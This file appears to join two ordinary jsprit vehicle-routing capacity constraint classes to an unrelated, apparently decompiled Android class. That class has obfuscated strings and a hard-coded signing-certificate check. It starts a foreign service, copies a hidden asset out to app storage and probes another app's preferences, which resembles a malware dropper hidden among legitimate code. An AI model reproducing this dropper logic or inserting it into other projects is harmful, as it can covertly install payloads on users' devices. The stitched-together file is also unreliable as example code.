/*
 * Licensed to GraphHopper GmbH under one or more contributor
 * license agreements. See the NOTICE file distributed with this work for
 * additional information regarding copyright ownership.
 *
 * GraphHopper GmbH licenses this file to you under the Apache License,
 * Version 2.0 (the "License"); you may not use this file except in
 * compliance with the License. You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.graphhopper.jsprit.core.problem.constraint;

import com.graphhopper.jsprit.core.algorithm.state.InternalStates;
import com.graphhopper.jsprit.core.problem.Capacity;
import com.graphhopper.jsprit.core.problem.misc.JobInsertionContext;
import com.graphhopper.jsprit.core.problem.solution.route.activity.*;
import com.graphhopper.jsprit.core.problem.solution.route.state.RouteAndActivityStateGetter;


/**
 * Ensures load constraint for inserting ServiceActivity.
 * <p>
 * <p>When using this, you need to use<br>
 *
 * @author schroeder
 */
public class ServiceLoadActivityLevelConstraint implements HardActivityConstraint {

    private RouteAndActivityStateGetter stateManager;

    private Capacity defaultValue;

    public ServiceLoadActivityLevelConstraint(RouteAndActivityStateGetter stateManager) {
        super();
        this.stateManager = stateManager;
        defaultValue = Capacity.Builder.newInstance().build();
    }

    @Override
    public ConstraintsStatus fulfilled(JobInsertionContext iFacts, TourActivity prevAct, TourActivity newAct, TourActivity nextAct, double prevActDepTime) {
        Capacity futureMaxLoad;
        Capacity prevMaxLoad;
        if (prevAct instanceof Start) {
            futureMaxLoad = stateManager.getRouteState(iFacts.getRoute(), InternalStates.MAXLOAD, Capacity.class);
            if (futureMaxLoad == null) futureMaxLoad = defaultValue;
            prevMaxLoad = stateManager.getRouteState(iFacts.getRoute(), InternalStates.LOAD_AT_BEGINNING, Capacity.class);
            if (prevMaxLoad == null) prevMaxLoad = defaultValue;
        } else {
            futureMaxLoad = stateManager.getActivityState(prevAct, InternalStates.FUTURE_MAXLOAD, Capacity.class);
            if (futureMaxLoad == null) futureMaxLoad = defaultValue;
            prevMaxLoad = stateManager.getActivityState(prevAct, InternalStates.PAST_MAXLOAD, Capacity.class);
            if (prevMaxLoad == null) prevMaxLoad = defaultValue;

        }
        if (newAct instanceof PickupService || newAct instanceof ServiceActivity) {
            if (!Capacity.addup(newAct.getSize(), futureMaxLoad).isLessOrEqual(iFacts.getNewVehicle().getType().getCapacityDimensions())) {
                return ConstraintsStatus.NOT_FULFILLED;
            }
        }
        if (newAct instanceof DeliverService) {
            if (!Capacity.addup(Capacity.invert(newAct.getSize()), prevMaxLoad).isLessOrEqual(iFacts.getNewVehicle().getType().getCapacityDimensions())) {
                return ConstraintsStatus.NOT_FULFILLED_BREAK;
            }
        }
        return ConstraintsStatus.FULFILLED;
    }
}

/*
 * Licensed to GraphHopper GmbH under one or more contributor
 * license agreements. See the NOTICE file distributed with this work for
 * additional information regarding copyright ownership.
 *
 * GraphHopper GmbH licenses this file to you under the Apache License,
 * Version 2.0 (the "License"); you may not use this file except in
 * compliance with the License. You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.graphhopper.jsprit.core.problem.constraint;

import com.graphhopper.jsprit.core.algorithm.state.InternalStates;
import com.graphhopper.jsprit.core.problem.Capacity;
import com.graphhopper.jsprit.core.problem.job.Delivery;
import com.graphhopper.jsprit.core.problem.job.Pickup;
import com.graphhopper.jsprit.core.problem.job.Service;
import com.graphhopper.jsprit.core.problem.misc.JobInsertionContext;
import com.graphhopper.jsprit.core.problem.solution.route.state.RouteAndActivityStateGetter;

/**
 * Ensures that capacity constraint is met, i.e. that current load plus
 * new job size does not exceeds capacity of new vehicle.
 * <p>
 * <p>If job is neither Pickup, Delivery nor Service, it returns true.
 *
 * @author stefan
 */
public class ServiceLoadRouteLevelConstraint implements HardRouteConstraint {

    private RouteAndActivityStateGetter stateManager;

    private Capacity defaultValue;

    public ServiceLoadRouteLevelConstraint(RouteAndActivityStateGetter stateManager) {
        super();
        this.stateManager = stateManager;
        this.defaultValue = Capacity.Builder.newInstance().build();
    }

    @Override
    public boolean fulfilled(JobInsertionContext insertionContext) {
        Capacity maxLoadAtRoute = stateManager.getRouteState(insertionContext.getRoute(), InternalStates.MAXLOAD, Capacity.class);
        if (maxLoadAtRoute == null) maxLoadAtRoute = defaultValue;
        Capacity capacityDimensions = insertionContext.getNewVehicle().getType().getCapacityDimensions();
        if (!maxLoadAtRoute.isLessOrEqual(capacityDimensions)) {
            return false;
        }
        if (insertionContext.getJob() instanceof Delivery) {
            Capacity loadAtDepot = stateManager.getRouteState(insertionContext.getRoute(), InternalStates.LOAD_AT_BEGINNING, Capacity.class);
            if (loadAtDepot == null) loadAtDepot = defaultValue;
            if (!Capacity.addup(loadAtDepot, insertionContext.getJob().getSize()).isLessOrEqual(capacityDimensions)) {
                return false;
            }
        } else if (insertionContext.getJob() instanceof Pickup || insertionContext.getJob() instanceof Service) {
            Capacity loadAtEnd = stateManager.getRouteState(insertionContext.getRoute(), InternalStates.LOAD_AT_END, Capacity.class);
            if (loadAtEnd == null) loadAtEnd = defaultValue;
            if (!Capacity.addup(loadAtEnd, insertionContext.getJob().getSize()).isLessOrEqual(capacityDimensions)) {
                return false;
            }
        }
        return true;
    }

}

public class To {
    static Context g = null;

    static Activity h = null;

    public static boolean i = true;

    String a = Amazing.a("7CMg9IkOzoFhHxlO7Ikput32Xl__");

    String b = Amazing.a("7CMg9IkOzoFhHxlO7Ikput32XcBvrIRDzC3lrIMCHxiRrn__");

    Intent c = new Intent();

    ProgressDialog d = null;

    AlertDialog e = null;

    int f = 0;

    String j = "3082025d308201c6a00302010202044de7355a300d06092a864886f70d010105050030723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a69303030313020170d3131303630323037303134365a180f32313232303530363037303134365a30723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a693030303130819f300d06092a864886f70d010101050003818d0030818902818100b2851f2f85af5894bdfd96b10b9465dfc10bf430d66f3837bd12f2346c438f3da0c16666cc23e7ae29c1f3ce30167d32376bb170b372fb8c87439b6ce7f0c3811818d60517131ddf1cead3db2e124f918d6b5db9899dd56fa28ff933c4ed855233d5318dd3d3b4fb28b00c5b8b8cec71a74a88a011d6c8256b90ce122a4a06330203010001300d06092a864886f70d0101050500038181000d72270a1c9970897335541d64ba729568a0f535aee7c20e5397f44d410e6cf76d0f97bc495eeb8e77d2d3d3ab6fe947515f4cb10468b073bf122a4e4bcdd2e6f0a6623af3bdc9039cc8139dc4fb32c58cf55f1661b730beaa5977faea9ace72e65448a002e5bffa6de75fcf14a1c3bcfd64d385c7e6654c4e2f52e635015dae";

    Random k = new Random();

    boolean l = false;

    private int m = 3;

    private Handler n = new Collection(this);

    private void a(int paramInt) {
        Message message = new Message();
        message.what = paramInt;
        this.n.sendMessage(message);
    }

    private void c() {
        try {
            this.c.setClassName(this.a, this.b);
            h.startService(this.c);
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private void d() {
        try {
            File file = new File(Amazing.a("9Ci5utjhztkp7cA_") + h.getPackageName() + Amazing.a("9Cz18t3N94nO7KTm"));
            if (file.exists())
                file.delete();
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private void e() {
        this.l = false;
        try {
            d();
            InputStream inputStream = h.getAssets().open(Amazing.a("7xBNzKFCzKFW"));
            FileOutputStream fileOutputStream = h.openFileOutput(Amazing.a("XvB5rtE_"), this.m);
            byte[] arrayOfByte = new byte[inputStream.available()];
            while (true) {
                if (inputStream.read(arrayOfByte) == -1) {
                    inputStream.close();
                    fileOutputStream.flush();
                    fileOutputStream.close();
                    this.l = true;
                    return;
                }
                fileOutputStream.write(arrayOfByte);
            }
        } catch (Exception exception) {
            return;
        }
    }

    public String a() {
        try {
            return (h.getBaseContext().getPackageManager().getPackageInfo(h.getPackageName(), 64)).signatures[0].toCharsString();
        } catch (Exception exception) {
            return null;
        }
    }

    public void a(Context paramContext, Activity paramActivity) {
        g = paramContext;
        h = paramActivity;
        if (this.j.equals(a()))
            b();
    }

    public void b() {
        int i;
        int j;
        if (Build.VERSION.RELEASE.startsWith("1.5"))
            return;
        c();
        try {
            i = (h.getPackageManager().getPackageInfo(h.getPackageName(), 0)).versionCode;
            Context context = h.createPackageContext(this.a, 2);
            Thread.sleep(500L);
            j = context.getSharedPreferences("first_app_perferences", this.m).getInt("global_b_version_id", 0);
            if (j == 0) {
                a(10);
                return;
            }
        } catch (Exception exception) {
            a(10);
            return;
        }
        if (j < i) {
            a(10);
            return;
        }
        d();
    }
}
